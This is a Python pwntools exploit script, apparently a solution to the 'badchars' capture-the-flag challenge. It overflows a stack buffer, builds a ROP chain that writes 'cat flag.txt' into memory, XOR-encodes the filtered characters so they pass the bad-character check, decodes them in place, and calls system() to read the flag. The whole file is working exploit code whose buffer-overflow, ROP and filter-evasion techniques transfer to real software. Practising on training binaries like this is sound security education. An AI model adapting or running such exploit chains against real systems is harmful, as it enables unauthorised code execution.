import pwn
import string

BUFFER = "A"*(40)
pop_rdi = 0x0000000000400b39
data_loc = 0x00601040
system_addr = 0x004009e8

# r13 and r15 must be the same address
pop_r12_r13_r14_r15 = 0x0000000000400bac
pop_r14_r15 = 0x0000000000400b40
pop_r12_pop_r13 = (0x0000000000400b3b)
mov_r12_to_r13 = (0x0000000000400b34)
xor_ptr_to_r15_with_r14b = 0x0000000000400b30


def add_padding(string):
    pad_len = len(string) % 8
    if pad_len != 0:
        string += ('\x00' * (8 - pad_len))
    return string


def split_string_into_chunks_of_eight(string):
    return [string[i:i+8] for i in range(0, len(string), 8)]


def is_badchar_in_payload(badchars, xored_string):
    for char in badchars:
        if char in xored_string:
            return True
    return False


def xor_string(payload, badchars):
    """
    For each charachter is string.ascii_letters,
    Look for badchars in the payload, and for each badchar xor it
    with the key, if the result is still a badchar,
    change the key and start over.
    When a key that successfuly changes all the badchars into valid ones,
    stop iterating.


    Returns A tuple containing:
        output: the string with the badchars xored.
        key: the xor key.
        xored_indexes: the indexes of the badchars,
            this is used to keep the payload short.
    """
    key = ""
    xored_indexes = []
    for k in string.ascii_letters:
        output = ""
        xored_indexes = []
        for c in range(len(payload)):
            if payload[c] in badchars:
                output += chr(ord(payload[c]) ^ ord(k))
                xored_indexes.append(c)
            else:
                output += payload[c]
        if (is_badchar_in_payload(badchars, output)):
            continue
        else:
            key = k
        break
    return output, key, xored_indexes


def write_64_bit_str_to_addr(addr_to_write_to, string):
    rop = ""

    rop += pwn.p64(pop_r12_pop_r13)
    # the string is written to r12
    rop += string
    # the address is written to r13
    rop += pwn.p64(addr_to_write_to)
    # move the r12 to the value pointed by r13.
    rop += pwn.p64(mov_r12_to_r13)

    return rop


def xor_chars(addr, key, xored_indexes):
    """
    Xores the characters that were changed.

    Params:
        addr: the address where the string is written.
        key: the key that was used to xor the chars.
        xored_indexes: the indexes where of characters that need to be xored.

    """
    rop = ""

    for i in xored_indexes:
        rop += pwn.p64(pop_r14_r15)
        rop += pwn.p64(ord(key))
        rop += pwn.p64(addr+i)
        rop += pwn.p64(xor_ptr_to_r15_with_r14b)

    return rop


def write_str_to_addr(addr_to_write_to, payload_string):
    """
    Writes a given string to a given address.
    If the string is longer than 8 bytes multiple write
    chains will be executed. Padding is added in order to align the string.
    In order to allow our payload to pass the badchars check, we:
        * Look for  bad charachters in the payload.
        * Xor them with a single key (one key for all characters).
        * After the string is written to memory, we xor the
          charachter(s) again,
    """
    badchars = ["b", "i", "c", "/", " ", "f", "n", "s"]

    # xor the string to avoid badchars
    xored_payload, key, xored_indexes = xor_string(payload_string, badchars)
    padded_xored_payload = add_padding(xored_payload)

    rop = ""
    payload_chunks = split_string_into_chunks_of_eight(padded_xored_payload)
    # same as write4
    for i in range(len(payload_chunks)):
        rop += write_64_bit_str_to_addr(addr_to_write_to + (i * 8),
                                        payload_chunks[i])
    # xor the bachars
    rop += xor_chars(addr_to_write_to, key, xored_indexes)

    return rop


def call_system_with_str(system_loc, string_loc):
    rop = ""
    rop += pwn.p64(pop_rdi)
    rop += pwn.p64(string_loc)
    rop += pwn.p64(system_loc)
    return rop


payload = (BUFFER + write_str_to_addr(data_loc, "cat flag.txt") +
           call_system_with_str(system_addr, data_loc))

pwn.context.terminal = ['st', '-e', 'sh', '-c']

DEBUG = False
if DEBUG:
    proc = pwn.gdb.debug('./badchars', """
    b *0x00000000004009dc
    b *0x004009e8
    continue
    """)
else:
    proc = pwn.process("./badchars")

print proc.recvuntil(">")
proc.sendline(payload)
print(proc.recvuntil("}"))
